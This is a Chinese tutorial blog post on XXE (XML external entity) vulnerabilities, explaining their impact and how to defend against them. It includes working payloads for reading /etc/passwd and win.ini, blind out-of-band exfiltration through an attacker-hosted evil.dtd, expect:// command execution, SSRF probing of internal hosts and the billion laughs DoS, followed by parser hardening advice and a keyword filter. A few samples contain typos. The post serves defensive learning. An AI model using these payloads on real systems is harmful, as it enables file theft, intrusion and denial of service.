---
title: XXE学习(二) 危害及防御
categories: web漏洞
---
## 危害
xxe漏洞的危害有很多，比如可以文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等 

---

<!--more-->
### 危害一：读取任意文件

#### 有回显

Xml.php:
```xml
<?php
$xml = <<<EOF
<?xml version = "1.0"?>
<!DOCTYPE ANY [
    <!ENTITY f SYSTEM "file:///etc/passwd">
]>
<x>&f;</x>
EOF;
$data = simplexml_load_string($xml);
print_r($data);
?>
```

访问XML.php可以读取etc/passwd文件内容

该CASE是读取/etc/passwd，有些XML解析库支持列目录，攻击者通过列目录、读文件，获取帐号密码后进一步攻击

如读取tomcat-users.xml得到帐号密码后登录tomcat的manager部署webshell。


例：

```xml
<!DOCTYPE foo [<!ELEMENT foo ANY >
<!ENTITY  xxe SYSTEM "file:///c:/windows/win.ini" >]>
<foo>&xxe;</foo>
```

```xml
<!DOCTYPE foo [<!ELEMENT foo ANY >
<!ENTITY  % xxe SYSTEM "http://xxx.xxx.xxx/evil.dtd" >
%xxe;]>
<foo>&evil;</foo>
```

而外部evil.dtd中的内容。
```
<!ENTITY evil SYSTEM “file:///c:/windows/win.ini” >
```

![](https://img-blog.csdnimg.cn/20210314145351346.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
#### 无回显：

如果程序没有回显的情况下，该怎么读取文件内容呢？需要使用`blind xxe`漏洞去利用

##### blind 1:
没有回显则可以使用Blind XXE漏洞来构建一条`带外`信道提取数据。

创建test.php写入以下内容：
```php
<?php 
file_put_contents("test.txt", $_GET['file']) ; 
?>
```

创建index.php写入以下内容：
```php
<?php 
$xml=<<<EOF 
<?xml version="1.0"?> 
<!DOCTYPE ANY[ 
<!ENTITY % file SYSTEM "file:///C:/test.txt"> 
<!ENTITY % remote SYSTEM "http://localhost/test.xml"> 
%remote;
%all;
%send; 
]> 
EOF; 
$data = simplexml_load_string($xml) ; 
echo "<pre>" ; 
print_r($data) ; 
?>
```

创建test.xml并写入以下内容：
```xml
<!ENTITY % all "<!ENTITY % send SYSTEM 'http://localhost/test.php?file=%file;'>">
```

当访问http://localhost/index.php, 存在漏洞的服务器会读出text.txt内容，发送给攻击者服务器上的test.php，然后把读取的数据保存到本地的test.txt中。

##### blind 2:

可以将文件内容发送到远程服务器，然后读取。

```xml
<?xml verstion="1.0" encoding="utf-8"?>
<!DOCTYPE a[
        <!ENTITY % f SYSTEM "http://yourhost/evil.dtd">
        %f;
]>
<a>&b;</a>
$data = simplexml_load_string($xml);
print_r($data);
```

远程服务器的evil.dtd文件内容:
```xml
<!ENTITY b SYSTEM "file:///etc/passwd">
```

##### blind 3:
可以使用外带数据通道提取数据，先使用php://filter获取目标文件的内容

然后将内容以http请求发送到接受数据的服务器(攻击服务器)xxx.xxx.xxx。

```xml
<?xml version=”1.0”?>
<!DOCTYPE ANY [
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=./target.php"> # /etc/issue
<!ENTITY % dtd SYSTEM "http://xxx.xxx.xxx/evil.dtd">
%dtd;
%send;
]>
```

evil.dtd的内容，内部的%号要进行实体编码成&#x25。
```xml
<!ENTITY % all
“<!ENTITY &#x25; send SYSTEM ‘http://xxx.xxx.xxx/?%file;’>”
>
%all;
```

有报错直接查看报错信息。

无报错需要访问接受数据的`服务器中的日志信息`，可以看到经过base64编码过的数据，解码后便可以得到数据。


##### 例子
恶意引入外部实体1：

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE a [
      <!ENTITY b SYSTEM "file:///etc/passwd">
]>
<aaa>&b;</aaa>
```

恶意引入外部实体2：

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE a [
     <!ENTITY % d SYSTEM "http://yourhost/evil.dtd">
     %d;
]>
<aaa>&b;</aaa>
```
DTD文件（evil.dtd）内容：
```xml
<!ENTITY b SYSTEM "file:///etc/passwd">
```
恶意引入外部实体3
```xml
<?xml verstion="1.0" encoding="utf-8"?>
<!DOCTYPE a SYSTEM "http://yourhost/evil.dtd">
]>
<c>&b;</c>
```
DTD文件内容
```xml
<!ENTITY b SYSTEM "file:///etc/passwd">
```

恶意引入外部实体(4)
 ```xml
<!DOCTYPE foo [<!ELEMENT foo ANY >
<!ENTITY  xxe SYSTEM "file:///c:/windows/win.ini" >]>
<foo>&xxe;</foo>
 ```

---
### 危害二：命令执行

php环境下，xml命令执行要求php装有expect扩展。而该扩展默认没有安装。

```php
<?php
$xml = <<<EOF
<?xml version = "1.0"?>
<!DOCTYPE ANY [
    <!ENTITY f SYSTEM "except://ls"> # id
]>
<x>&f;</x>
EOF;
$data = simplexml_load_string($xml);
print_r($data);
?>
```

该CASE是在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。


---
 ### 危害三：内网探测/SSRF
由于xml实体注入攻击可以利用http://协议，也就是可以发起http请求。可以利用该请求去探查内网，进行SSRF攻击。

 ```php
<?php
$xml = <<<EOF
<?xml version = "1.0"?>
<!DOCTYPE ANY [
    <!ENTITY f SYSTEM "http://192.168.1.1:80/">
]>
<x>&f;</x>
EOF;
$data = simplexml_load_string($xml);
print_r($data);
?>
 ```

---
### 危害四：DDOS
```xml
<?xml version="1.0"?>
 <!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
 ]>
 <lolz>&lol9;</lolz>

```
上面样例代码2中的XXE漏洞攻击就是著名的’billion laughs’ 攻击。

(https://en.wikipedia.org/wiki/Billion_laughs)，该攻击通过创建一项递归的 XML 定义，在内存中生成十亿个”Ha!”字符串，从而导致 DDoS 攻击。

---
## XXE修复与防御
xxe漏洞存在是`因为XML解析器解析了用户发送的不可信数据`。然而，要去校验DTD(document type definition)中SYSTEM标识符定义的数据，并不容易，也不大可能。大部分的XML解析器默认对于XXE攻击是脆弱的。因此，`最好的解决办法就是配置XML处理器去使用本地静态的DTD，不允许XML中含有任何自己声明的DTD。`通过设置相应的属性值为false，XML外部实体攻击就能够被阻止。因此，可将外部实体、参数实体和内联DTD 都被设置为false，从而避免基于XXE漏洞的攻击。

### 方案一：使用开发语言提供的禁止外部实体的方法
>PHP
libxml_disable_entity_loader(true);

>JAVA
DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
dbf.setExpandEntityReferences(false);

>Python
from lxml import etree
xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))



### 方案二：过滤提交的xml数据
过滤关键词：<!DOCTYPE和<!ENTITY，或者SYSTEM和PUBLIC。

---
## 参考
[XXE漏洞学习](https://www.cnblogs.com/zhaijiahui/p/9147595.html#autoid-7-2-0)

